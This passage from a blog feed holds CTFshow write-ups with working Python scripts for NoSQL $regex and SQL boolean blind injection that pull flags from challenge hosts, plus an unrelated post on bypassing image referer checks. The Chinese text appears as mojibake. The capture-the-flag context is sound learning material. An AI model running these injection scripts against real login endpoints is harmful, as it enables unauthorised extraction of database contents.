src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559031690-d2869572-b4e7-4998-82b0-ac7e4a1077cc.png" alt="image.png"></p><h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p>è¿™é‡Œç›´æ¥ç”¨åˆ«äººçš„è„šæœ¬äº†ï¼š<br>é“ç†æ˜¯ç›¸åŒçš„ï¼Œä¸€ç‚¹ç‚¹çŒœå³å¯ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">-- coding:UTF-8 --</span></span><br><span class="line"># Author:å­¤æ¡œæ‡¶å¥‘</span><br><span class="line"># <span class="type">Date</span>:<span class="number">2021</span><span class="operator">/</span><span class="number">8</span><span class="operator">/</span><span class="number">4</span></span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://a2efa0f0-f634-4621-bd4a-e96a4f1b0196.challenge.ctf.show:8080/api/&quot;</span><br><span class="line">str <span class="operator">=</span> &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,ï¼Œ&quot;</span><br><span class="line">flag <span class="operator">=</span> &quot;&quot;</span><br><span class="line"></span><br><span class="line">payload_user <span class="operator">=</span> &quot;flag.*&quot;</span><br><span class="line">payload_pass <span class="operator">=</span> &quot;^&#123;&#125;.*&quot;</span><br><span class="line"></span><br><span class="line">n <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;username[$regex]&#x27;</span>:payload_user,</span><br><span class="line">            <span class="string">&#x27;password[$regex]&#x27;</span>:payload_pass.format(flag<span class="operator">+</span>j)</span><br><span class="line">        &#125;</span><br><span class="line">        res <span class="operator">=</span> requests.post(url <span class="operator">=</span> url, data<span class="operator">=</span>data)</span><br><span class="line">        if r&quot;\u767b\u9646\u6210\u529f&quot; <span class="keyword">in</span> res.text:</span><br><span class="line">            flag <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">            n <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">            print(<span class="string">&#x27;[*] å¼€å§‹ç›²æ³¨ç¬¬&#123;&#125;ä½&#x27;</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            if j <span class="operator">=</span><span class="operator">=</span> &quot;&#125;&quot;:</span><br><span class="line">                print(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559359451-1e99e676-d5bf-441a-9aa3-ead32343ea3f.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Pythonè„šæœ¬ä¿®æ”¹è¯­é›€å¯¼æ–‡ä»¶å›¾ç‰‡æ ¼å¼(äºŒ)</title>
      <link href="/2023/07/14/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F(%E4%BA%8C)/"/>
      <url>/2023/07/14/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<p>å¦‚æœä½ ç”¨äº†æˆ‘ä¹‹å‰å‘çš„è„šæœ¬ï¼Œä½ å°±ä¼šå‘ç°è¿™ä¸ªå›¾ç‰‡åˆ åç¼€è§£æåŠŸèƒ½å¤±æ•ˆäº†ã€‚<br>ä¸ä»…å¦‚æ­¤ï¼Œä»¥å‰ç”¨è¿‡ç”Ÿæˆçš„æ‰€æœ‰å›¾ç‰‡ä¹Ÿå¤±æ•ˆäº†ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341771143-c9ff93d6-105e-4b66-843b-6a71055630dc.png" alt="image.png"><br>å¦‚æœé¢„è§ˆçš„è¯ï¼Œä¼šæç¤ºå¦‚ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341553395-02439fe9-4d5d-4472-addd-b145a50c68a5.png" alt="image.png"><br>ä½†æ˜¯å½“å¤šæ¬¡è®¿é—®ä¹‹åå°±ä¼šæç¤ºä¸‹è½½ï¼Œä½†æ˜¯å›¾ç‰‡ä»ç„¶ä¸ä¼šè§£æã€‚<br>æœ¬æ¥ä»¥ä¸ºç”¨ä¸äº†äº†ï¼Œæ‰“ç®—æä¸ªæ¥å£è‡ªå·±åˆ·æ–°ï¼Œä½†æ˜¯æ•™ç¨‹å¤ªä¹±äº†ï¼Œè€Œä¸”æ„Ÿè§‰åº”è¯¥è¿˜æœ‰ç»•è¿‡çš„åŠæ³•ã€‚<br>ç»è¿‡å¤šæ¬¡è°ƒè¯•å‘ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªrefereréªŒè¯ã€‚<br>æ²¡æœ‰refererçš„è®¿é—®æ˜¯ä¼šè¢«403çš„ã€‚<br>å› æ­¤è¿™ä¸ªé—®é¢˜å°±å˜æˆäº†å¦‚ä½•è®©è®¿é—®å…·æœ‰refereréªŒè¯ï¼Œæˆ–è€…è¯´ä¸è®©ä»–éªŒè¯ã€‚<br>åœ¨ç½‘ä¸ŠæŸ¥äº†å¾ˆä¹…å‘ç°ä¸€æ®µä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>ç”¨å®ƒæ¥æ‹’ç»refererçš„è¯·æ±‚ã€‚åŸæ–‡æç¤ºè¯´ï¼Œéœ€è¦æ”¾åœ¨ä¸»é¢˜æ–‡ä»¶ä¸‹çš„post.ejsæ–‡ä»¶ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341855216-ca39347e-3323-48e1-8f30-3c30a27f6efd.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341886707-ad13d3bd-e38d-4ca6-8f99-950d29a7933b.png" alt="image.png"><br>å¦‚æœåˆ°è¿™é‡Œï¼Œä½ çš„åšå®¢æ­£å¥½æœ‰<code>.ejs</code>æ–‡ä»¶ã€‚é‚£å°±å°‘äº†å¾ˆå¤šæŠ˜è…¾ã€‚<br>ä»¥æˆ‘çš„ä¸ºä¾‹ï¼ˆbutterflyï¼‰è¿™ä¸ªä¸»é¢˜æ–‡ä»¶ä¸‹çš„å†…å®¹å…¨æ˜¯ä»¥<code>.pug</code>æ ¼å¼ä¸ºåç¼€ï¼Œ<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341987132-603e1d10-1028-495d-b11c-7f6ff6dc77fd.png" alt="image.png"><br>å› æ­¤ï¼ŒåŸå°ä¸åŠ¨ç…§æŠ„æ˜¯ä¼šä¸€ç‰‡çº¢çš„ã€‚<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342102855-d9c2abd5-2686-4a18-b042-81261ab1a39a.png" alt="image.png"><br>ç ”ç©¶äº†æŒºé•¿æ—¶é—´ï¼Œæ‰¾äº†æ‰¾è¯­æ³•ï¼Œå¾—åˆ°äº†ä¸€ç§ä¿®æ”¹åŠæ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meta(name=<span class="string">&quot;referrer&quot;</span>, content=<span class="string">&quot;no-referrer&quot;</span>)</span><br></pre></td></tr></table></figure><p>å°†å…¶ä¿®æ”¹æˆå¯¹åº”è¯­æ³•ï¼Œå¹¶ä¸”å¡åˆ°æŸä¸€ä¸ªä½ç½®ã€‚æ³¨æ„ï¼Œè¿™è¡Œä»£ç åœ¨ä¸åŒä½ç½®ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä½ çš„åšå®¢æ’ç‰ˆé”™è¯¯ã€‚<br>æˆ‘æ”¾åœ¨äº†<code>themes\butterfly\layout</code>ä¸‹çš„post.pugï¼Œå¹¶ç½®äºï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342167433-b44c1209-5565-4bdd-9140-991addb4bdeb.png" alt="image.png"><br>å†è¯´ä¸€éï¼Œè¿™è¡Œä»£ç åœ¨ä¸åŒä½ç½®ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä½ çš„åšå®¢æ’ç‰ˆé”™è¯¯ã€‚è¿™é‡Œæ˜¯æˆ‘è¯•è¿‡ä¸ä¼šæ’ç‰ˆé”™è¯¯ï¼Œè€Œä¸”èƒ½é‡æ–°æ‹‰å–åˆ°å›¾ç‰‡çš„åœ°æ–¹ã€‚<br>ä¿å­˜ä¹‹åï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœ¬åœ°ï¼›æ‹‰å–æ•ˆæœã€‚<br>å¦‚æœé‡æ–°å‡ºç°å›¾ç‰‡ï¼Œå°±è¯´æ˜æ‹‰å–æˆåŠŸäº†ï¼Œdeployåˆ°è¿œç«¯å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342465833-28799703-6b56-49d7-af39-bd43bd76e6ce.png" alt="image.png"></p><h2 id="å·²ç»æœ‰äº†æ›´å¥½çš„åŠæ³•"><a href="#å·²ç»æœ‰äº†æ›´å¥½çš„åŠæ³•" class="headerlink" title="å·²ç»æœ‰äº†æ›´å¥½çš„åŠæ³•"></a>å·²ç»æœ‰äº†æ›´å¥½çš„åŠæ³•</h2><p>ä¹‹å‰æŒ‰è¿™æ ·æ”¹ï¼Œä¼šå‡ºç°è¿›å…¥é¡µé¢è¿˜æ˜¯æŸåå›¾ç‰‡ï¼Œä½†æ˜¯ç‚¹å‡»è·å–ä¸€ä¸‹ï¼Œå†åˆ·æ–°é¡µé¢å°±ä¼šæ­£å¸¸è·å–å›¾ç‰‡ã€‚<br>æ€è€ƒäº†ä¸€ä¸‹ï¼Œè¿™ä¸å°±è¯´æ˜å¼•ç”¨æ¡ä»¶å¤ªæ™šäº†ï¼Œå›¾ç‰‡å·²ç»è¢«è¯·æ±‚è¿‡äº†ã€‚<br>é‚£æˆ‘å°±æœ‰ä¸ªæƒ³æ³•ï¼Œç›´æ¥æ”¹åˆ°å¼•ç”¨æ¯”è¾ƒé å‰çš„æ–‡ä»¶ä¸­å»ï¼Œæ¯”å¦‚è¯´ï¼š<br><code>\themes\butterfly\layout\includes</code>æ–‡ä»¶å¤¹ä¸‹çš„<code>layout.pug</code>åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å†™ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689343646123-2d3213ae-5535-4e76-b193-2df07d9aa8b4.png" alt="image.png"><br>ä¿å­˜åˆ·æ–°ä¸€ä¸‹ï¼Œå‘ç°å·²ç»å¯ç”¨äº†ã€‚è¿›å…¥åŠ è½½é¡µé¢å°±å¯ä»¥æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>å¦‚æœä¿®æ”¹ä¹‹åè¿˜æ²¡æ˜¾ç¤ºï¼Œæ¸…é™¤cookieåˆ·æ–°ä¸€ä¸‹è¯•è¯•ï¼Œå¦‚æœè¿˜ä¸è¡Œï¼Œé‚£å°±åªèƒ½è‡ªå·±å†æƒ³åŠæ³•äº†ã€‚æ”¹è¿‡å¥½å‡ ä¸ªäº†ï¼Œåº”è¯¥è¿˜èƒ½æŒºä¸€æ®µæ—¶é—´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„šæœ¬ </tag>
            
            <tag> Shortcut </tag>
            
            <tag> è¯­é›€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web191-web213SQLæ³¨å…¥ç¯‡ï¼ˆäºŒï¼‰</title>
      <link href="/2023/07/12/web191-web213SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/07/12/web191-web213SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><p>è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œç”±äºæ¢äº†ä¸€ç« ï¼Œå°±é‡æ–°å™è¿°ä¸€ä¸‹ã€‚<br>å¸ƒå°”ç›²æ³¨éœ€è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªå¯æ”¹å˜çš„æ³¨å…¥ç‚¹ã€‚<br>æ¯”å¦‚ï¼š</p><ul><li><code>admin&#39; and 0#</code>æ—¶è¿”å›çš„æ˜¯ç”¨æˆ·åä¸å­˜åœ¨</li><li><code>admin&#39; and 1#</code>è¿”å›çš„æ˜¯å¯†ç é”™è¯¯</li></ul><p>ç”±æ­¤ç¼–å†™è„šæœ¬ï¼šè¿™é¢˜è¿˜æ˜¯ç”¨æ˜¯190çš„è„šæœ¬å³å¯<br>ç›´æ¥ä½¿ç”¨paayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLå¸ƒå°”ç›²æ³¨2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://cc8108f9-dbcc-44a5-aba7-90536cd74d69.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;å¯†ç é”™è¯¯&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, $username))&#123;</span><br><span class="line">        $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">        die(json_encode($ret));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯æƒœå¯¹æˆ‘æ²¡ç”¨ï¼Œæˆ‘è¿™é‡Œæ²¡ç”¨asciiåšï¼Œå‰é¢å‡ ä¸ªå¯ä»¥ç»“åˆasciiå’ŒäºŒåˆ†æ³•ç»“åˆæŸ¥æ‰¾ï¼Œwpå†™çš„å¾ˆå·§å¦™ã€‚<br>æ¯”å¦‚ï¼š<code>if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)</code><br>è¿˜æ˜¯ä½¿ç”¨ä¸Šé¢˜çš„è„šæœ¬ã€‚</p><h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h3 id="substrè¿‡æ»¤å¯ä»¥ä½¿ç”¨midã€leftã€rightæ¥ä»£æ›¿"><a href="#substrè¿‡æ»¤å¯ä»¥ä½¿ç”¨midã€leftã€rightæ¥ä»£æ›¿" class="headerlink" title="substrè¿‡æ»¤å¯ä»¥ä½¿ç”¨midã€leftã€rightæ¥ä»£æ›¿"></a>substrè¿‡æ»¤å¯ä»¥ä½¿ç”¨midã€leftã€rightæ¥ä»£æ›¿</h3><p>æŠŠsubstrè¿‡æ»¤äº†ï¼Œæ ¹æ®ç½‘ä¸Šæ‰€è¯´ï¼Œå¯ä»¥ç”¨è¿™å‡ ä¸ªæ¥å®ç°ç›¸åŒæ“ä½œï¼š<br>å…ˆæ¥ä»‹ç»ä¸€ä¸‹å‡ ä¸ªå‡½æ•°ç”¨æ³•ï¼Œä»¥ä¸‹ç”±gptè¾“å‡ºã€‚</p><ol><li>MIDå‡½æ•°ï¼š<ul><li>MID(string, start, length)ï¼šä»æŒ‡å®šçš„å­—ç¬¦ä¸²ä¸­æå–ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼š<ul><li>stringï¼šè¦æå–å­å­—ç¬¦ä¸²çš„æºå­—ç¬¦ä¸²ã€‚</li><li>startï¼šæŒ‡å®šè¦å¼€å§‹æå–çš„ä½ç½®çš„ç´¢å¼•ã€‚ç´¢å¼•ä»1å¼€å§‹ã€‚</li><li>lengthï¼šæŒ‡å®šè¦æå–çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</li></ul></li></ul><ol><li>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²â€™Hello, World!â€™ï¼Œä½ å¯ä»¥ä½¿ç”¨MIDå‡½æ•°æå–å…¶ä¸­çš„å­å­—ç¬¦ä¸²ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</li></ol><ul><li>MID(â€˜Hello, World!â€™, 1, 5)ï¼šæå–ä»ç´¢å¼•ä½ç½®1å¼€å§‹çš„5ä¸ªå­—ç¬¦ï¼Œç»“æœä¸ºâ€™Helloâ€™ã€‚</li></ul></li><li>LEFTå‡½æ•°ï¼š<ul><li>LEFT(string, length)ï¼šä»æŒ‡å®šçš„å­—ç¬¦ä¸²çš„å¼€å¤´æå–ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼š<ul><li>stringï¼šè¦æå–å­å­—ç¬¦ä¸²çš„æºå­—ç¬¦ä¸²ã€‚</li><li>lengthï¼šæŒ‡å®šè¦æå–çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</li></ul></li></ul><ol><li>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²â€™Hello, World!â€™ï¼Œä½ å¯ä»¥ä½¿ç”¨LEFTå‡½æ•°æå–å…¶ä¸­çš„å­å­—ç¬¦ä¸²ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</li></ol><ul><li>LEFT(â€˜Hello, World!â€™, 5)ï¼šæå–å¼€å¤´çš„5ä¸ªå­—ç¬¦ï¼Œç»“æœä¸ºâ€™Helloâ€™ã€‚</li></ul></li><li>RIGHTå‡½æ•°ï¼š<ul><li>RIGHT(string, length)ï¼šä»æŒ‡å®šçš„å­—ç¬¦ä¸²çš„æœ«å°¾æå–ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼š<ul><li>stringï¼šè¦æå–å­å­—ç¬¦ä¸²çš„æºå­—ç¬¦ä¸²ã€‚</li><li>lengthï¼šæŒ‡å®šè¦æå–çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</li></ul></li></ul><ol><li>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²â€™Hello, World!â€™ï¼Œä½ å¯ä»¥ä½¿ç”¨RIGHTå‡½æ•°æå–å…¶ä¸­çš„å­å­—ç¬¦ä¸²ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</li></ol><ul><li>RIGHT(â€˜Hello, World!â€™, 6)ï¼šæå–æœ«å°¾çš„6ä¸ªå­—ç¬¦ï¼Œç»“æœä¸ºâ€™World!â€™ã€‚</li></ul></li></ol><p>è¿™é‡Œç”¨midå³å¯ï¼Œç¨ä½œä¿®æ”¹è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLå¸ƒå°”ç›²æ³¨2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://b40c977f-1bc2-4d31-97ee-da13510260aa.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;å¯†ç é”™è¯¯&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            